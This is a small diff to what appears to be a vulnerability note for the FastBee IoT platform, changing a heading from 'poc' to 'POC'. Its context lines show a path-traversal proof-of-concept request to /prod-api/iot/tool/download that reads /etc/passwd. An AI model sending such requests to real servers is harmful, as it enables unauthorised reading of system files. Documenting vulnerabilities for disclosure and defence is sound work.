@@ -8,7 +8,7 @@
 "fastbee"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
